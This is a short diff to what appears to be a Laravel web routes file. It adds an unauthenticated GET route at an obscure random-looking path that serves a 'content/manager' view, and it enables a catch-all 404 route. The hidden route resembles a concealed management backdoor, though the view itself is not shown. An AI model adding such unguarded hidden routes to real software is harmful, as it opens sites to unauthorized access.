@@ -23,6 +23,10 @@ Route::prefix('connector')
 		Route::delete('cart', 'SessionController@delete');
 });
 
+Route::get('xlle76n10f', function() {
+	return view('content/manager');
+});
+
 Route::get('download-pdf/{number}', 'OrderController@invoice');
 Route::post('create_report', 'ReportController@create');
 Route::post('rep-avail', 'ProductController@all');
@@ -49,7 +53,8 @@ Route::post('/back_call', function (Request $request) {
 		return $requestException;
 	}
 });
-// Route::get('/{any}', 'Page404Controller@notFound');
+
+Route::get('/{any}', 'Page404Controller@notFound');
 
 
 
